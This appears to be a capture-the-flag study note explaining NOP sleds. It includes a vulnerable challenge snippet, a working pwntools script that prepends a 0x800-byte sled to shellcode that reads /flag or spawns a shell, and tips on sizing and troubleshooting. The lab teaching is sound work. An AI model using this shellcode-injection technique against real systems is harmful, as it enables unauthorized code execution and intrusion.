
- A **NOP sled** is a long run of `nop` instructions (`0x90` on x86/amd64) placed right before your real shellcode.
- `nop` does nothing except move to the next instruction — so no matter _where_ execution lands inside the sled, it just slides forward through the `nop`s until it reaches your actual shellcode.
- Used whenever you **can't land exactly** on the start of your shellcode — random landing offset, unpredictable jump target, or (like the challenge below) the program itself randomly skips part of your input.

---
## <span style="color:rgb(146, 208, 80)">The Goal:</span>

Execution lands somewhere uncertain inside your payload ↓ Pad the front with NOPs (`\x90`) so any landing spot is safe ↓ Real shellcode sits after the NOPs ↓ Execution slides through the NOPs and hits your shellcode ↓ Get flag

---

### <span style="color:rgb(146, 208, 80)">1- Why this is needed (example scenario)</span>

Some challenges don't run your shellcode from the exact start — they may skip a random number of bytes before executing it (simulating imprecise landing from ASLR, a fuzzy jump, etc):

```c
// challenge reads your shellcode onto the stack...
shellcode_size = read(0, shellcode, 0x1000);

// ...then randomly skips somewhere between 0x100 and 0x800 bytes before running it
int to_skip = (rand() % 0x700) + 0x100;
shellcode += to_skip;
shellcode_size -= to_skip;

((void(*)())shellcode)();   // executes starting from the (randomly shifted) address
```

If you just send raw shellcode, the random skip lands execution in the _middle_ of your instructions — garbage/crash. A NOP sled fixes this: as long as the sled is **at least as large as the maximum possible skip**, execution always lands somewhere inside the sled and slides safely into your real shellcode afterward.

---

### <span style="color:rgb(146, 208, 80)">2- Building the payload</span>

```python
from pwn import *

context.arch = 'amd64'

p = process('./binary')          # local
# p = remote('host', 1337)       # remote CTF

shellcode = asm(shellcraft.cat('/flag'))   # or shellcraft.sh(), or your own asm()

nop_sled = b'\x90' * 0x800        # size >= the maximum possible skip/uncertainty

payload = nop_sled + shellcode

p.send(payload)
p.interactive()
```

Structure of the payload:

```
[ NOP NOP NOP NOP ... ] [ real shellcode ]
        ↑ landing can be anywhere in here, still slides through safely
```

---

### <span style="color:rgb(146, 208, 80)">3- Sizing the sled</span>

- The sled only needs to be **as big as the worst-case uncertainty** — if the challenge might skip up to `0x800` bytes, your sled needs to be at least `0x800` bytes.
- Bigger is safer but not free — check the total payload still fits in whatever buffer/read size the challenge allows (e.g. here, the total read is capped at `0x1000` bytes, so `sled + shellcode` must stay under that).
- If you don't know the exact uncertainty, err on the larger side within the size limit — a sled that's too small defeats the purpose.

---

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span>

|PROBLEM|FIX|
|---|---|
|Still crashing / landing outside the sled|Sled too small — check the max possible skip/offset and size the sled to cover it|
|Payload rejected / truncated|`sled + shellcode` exceeds the max bytes the program reads — shrink the sled or shellcode|
|Shellcode runs but does nothing useful|Make sure `nop_sled + shellcode` is concatenated in that order — sled must come _before_ the shellcode|
|Works locally, fails remote|Re-check timing/buffering; use `p.send()` not `p.sendline()` unless the challenge expects a newline|